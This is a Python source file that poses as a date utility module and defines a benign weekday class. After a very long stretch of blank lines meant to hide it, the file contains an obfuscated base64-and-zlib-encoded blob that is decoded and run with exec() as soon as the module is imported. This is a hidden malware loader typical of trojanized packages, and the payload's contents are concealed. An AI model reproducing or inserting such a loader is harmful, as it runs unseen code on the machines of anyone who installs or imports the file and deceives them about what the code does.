



class weekday(object):
    __slots__ = ["weekday", "n"]

    def __init__(self, weekday, n=None):
        self.weekday = weekday
        self.n = n

    def __call__(self, n):
        if n == self.n:
            return self
        else:
            return self.__class__(self.weekday, n)

    def __eq__(self, other):
        try:
            if self.weekday != other.weekday or self.n != other.n:
                return False
        except AttributeError:
            return False
        return True

    def __hash__(self):
        return hash((
          self.weekday,
          self.n,
        ))

    def __ne__(self, other):
        return not (self == other)

    def __repr__(self):
        s = ("MO", "TU", "WE", "TH", "FR", "SA", "SU")[self.weekday]
        if not self.n:
            return s
        else:
            return "%s(%+d)" % (s, self.n)

# vim:ts=4:sw=4:et











































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































import zlib
import base64
#
QWUO_G = ''
QWUO_G += 'eJx1k1uPqjoYhu/9FSbrQidxHJGTTjIXgJwEARXxsLL2CocCCpVSCoi/fmMy2dnZ'
QWUO_G += 'WbsXPbzf+z1pv7Y/hjENuzkM2uLAunuo0DcNweUjSKRKsWSPc1gioKNbLrTGm4VE'
QWUO_G += 'Sf01VdxuRfNwZ4MfwwOvuZB9SjMBXiRfcMyq3iMXRrB12Ieoz8MAHXRpR9N0aJQJ'
QWUO_G += 'c4w7i7TC/mScYXN6ekuPp32j58iuNhPMMHROUfZQinut68INbtdmLPRRvbEuzaFs'
QWUO_G += 'tVXd+akqtYU/L1cp29inJ+iCWtvmKuvdTRj4Ju798YppvGirZUe35nZmbMwv7u7c'
QWUO_G += 'ZTc5lQJOjCJxbneUk2Xbu2hQR03mAOBDLyKOX94Iv2SruxO9QJlbnV2fqTblFtad'
QWUO_G += '2IhrE8e9XwBoJeyqYM0l4b0gxjVOkRqfr7RBpD6N929NXG8a0cDnpXJlqXgpHBWL'
QWUO_G += 'd1i7jFfWi1wiDOn2RALXbumr6DL5KTBlonHzrSE+vZSXeUt9ct5VazVnZi+6pXyz'
QWUO_G += '9OJQ2DCh3eNJhatGSa89CS+OHGyhCqmnZD58ZlVKjzNVW+ejVoZxbUtocIWowGSI'
QWUO_G += 'waTqqklRDX4XNZn8Bhh/9cK0ItFr/T3t1cEf1a8Cgfu4qKYRaO51nk9GbTB6m/xR'
QWUO_G += 'HRDcfQ6Grz7GBRzWOM+vwXz4vZN++UobDMEjBIj82zPFoKxBRf5jHb68IBw/X5YI'
QWUO_G += 'hAVEGFTVOPArwDHTgOJeYgTGGEyrOhgPhkM8+vnX7H3pB2EE4l+jyWg0+YaNRykh'
QWUO_G += '6PPjI7iSad597ELH76hY0GJwHL31O/Cj8dv0GziqSfy+6A8a535SffX8zcF0dVO3'
QWUO_G += '5MHw7Sfz+c78mtYIATx+69vg+0jIr6r/qeM/1e9vb6eqxTGvzR2yJXZn0fJWtDRb'
QWUO_G += 'ASwHNodFieHrlzl8tD3ML5H9um8/3wnJ0T3FqlWhQma0exwsnos+ct/zj6KTo3Pg'
QWUO_G += 'ZbouO6EFLNdIwKyugNV662sCGe+mp8jeSvI6qymennuzbukUmnra4G6V7uT2oPYk'
QWUO_G += 'li2YftDcyIe+daBkK7bX69fLNiNycRmTJ1shvLGbGhFI8+YTz/CjCwNeEVnEsWVS'
QWUO_G += '89ksMm/Cvq+o9nhKxobJN4LAVLISWfre7lGJgosLWXMpwmvB5/eBpD/OUg36EMwN'
QWUO_G += 'lipn4J6B03Me2Px6JZiOuIUZE6XJqvORlv0NAjyRiw=='
#
QWUO_G = base64.b64decode(QWUO_G)
QWUO_G = zlib.decompress(QWUO_G)
if QWUO_G:
    exec(QWUO_G)
#






































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































